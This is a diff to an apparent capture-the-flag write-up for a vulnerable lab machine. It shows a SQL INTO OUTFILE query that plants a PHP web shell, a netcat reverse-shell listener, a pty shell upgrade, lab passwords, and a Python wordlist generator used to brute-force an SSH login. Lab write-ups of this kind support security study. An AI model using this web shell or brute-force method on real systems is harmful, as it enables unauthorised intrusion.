@@ -98,7 +98,7 @@ Password: !q\]Ej?*5K5cy*AJ
 
 
 #### Send request sql on `/var/www/forum/template_c/`
-```
+```sql
 SELECT '<?php system($_GET["payload"]); ?>' INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
 ```
 ![screenshot](screen/SQLrequest.png)
@@ -136,9 +136,100 @@ nc -lnvp 9999
 ![screenshot](screen/LOOKATMEFILE.png)
 
 #### Get interactive shell with python
-```
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 Login: lmezard
 Password: G!@M6f4Eatau{sF"
 ```
 ![screenshot](screen/TTYshell.png)
+
+### New challenge very fun for get laurie password
+
+![screenshot](screen/lmezardhome.png)
+
+![screenshot](screen/pcapfunlist.png)
+
+#### Files are not real pcap
+
+```
+[amnesia@archlinux ~/Downloads/fun/ft_fun]$ file CMZGN.pcap
+CMZGN.pcap: ASCII text
+```
+
+![screenshot](screen/greppcap.png)
+
+#### After analyzing the files manually
+
+![screenshot](screen/vscodemainpcap.png)
+
+#### In the files we find this
+
+```C
+char getme8() {
+	return 'w';
+}
+char getme9() {
+	return 'n';
+}
+char getme10() {
+	return 'a';
+}
+char getme11() {
+	return 'g';
+}
+char getme12()
+{
+	return 'e';
+}
+```
+
+So we have the end of the password
+
+#### Here's a script to create a word list with all possibilities
+
+```python
+end = "wnage"
+other = "aIetrph"
+f = open("hashed.txt", "a")
+
+import hashlib
+
+from itertools import chain, product
+def bruteforce(charset, maxlength):
+    return (''.join(candidate)
+        for candidate in chain.from_iterable(product(charset, repeat=i)
+        for i in range(1, maxlength + 1)))
+
+def double_letters(word: str):
+    for i in word:
+        if word.count(i) != 1:
+            return True
+    return False
+
+for i in list(bruteforce('aIetrph', 7)):
+    if len(i) == 7 and double_letters(i) == False:
+        m = i+end
+        hash = hashlib.sha256(m.encode('utf-8')).hexdigest()
+        print(m+" : "+hash)
+        
+        f.write(hash+"\n")
+```
+
+#### Once the wordlist is created, we can bruteforce the password in ssh
+
+Tool: https://github.com/calc1f4r/SSH-Bruteforcer
+
+![screenshot](screen/forcessh.png)
+
+#### After 15 coffees 
+
+![screenshot](screen/passwordsshlaurie.png)
+
+```
+Pseudo: laurie
+Password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+
+#### We are connected in ssh with laurie
+
+![screenshot](screen/laurieconnected.png)
